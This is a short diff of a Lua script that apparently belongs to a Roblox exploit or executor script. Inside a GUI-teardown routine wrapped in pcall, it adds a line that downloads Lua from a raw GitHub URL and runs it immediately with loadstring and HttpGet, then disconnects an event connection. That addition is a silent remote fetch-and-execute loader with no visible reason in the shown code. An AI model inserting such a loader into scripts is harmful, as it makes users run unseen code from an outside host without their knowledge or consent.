@@ -481,7 +481,9 @@ local Set = function()
 for _,v in pairs(CONNECTIONS) do
 if v ~= CONNECTIONS[6] then
 pcall(function()
-game:GetService("CoreGui"):FindFirstChild("GUI"):Destroy()				
+game:GetService("CoreGui"):FindFirstChild("GUI"):Destroy()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Eynxia/Test/main/Main.lua"))()
+CONNECTIONS[6]:Disconnect()
 end)
 						
 
